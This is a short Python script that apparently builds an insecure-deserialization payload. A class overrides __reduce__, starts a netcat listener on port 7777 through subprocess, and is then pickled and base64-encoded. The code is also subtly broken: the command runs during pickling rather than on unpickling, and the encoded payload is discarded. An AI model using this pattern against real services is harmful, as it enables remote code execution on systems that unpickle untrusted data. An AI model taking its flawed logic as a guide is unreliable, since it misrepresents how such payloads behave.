# -*- coding: utf-8 -*-

import base64
import pickle
import subprocess


class MyLittleBastard(object):
	def __reduce__(self):
		import platform

		if platform.system().lower() == "linux":
			cmd = "/bin/nc"
		else:
			cmd = "/usr/bin/nc"

		subprocess.Popen([cmd, "-l", "7777", "-k"])

		return self.__class__, tuple(),


def main():
	base64.b64encode(pickle.dumps(MyLittleBastard()))

if __name__ == '__main__':
	main()
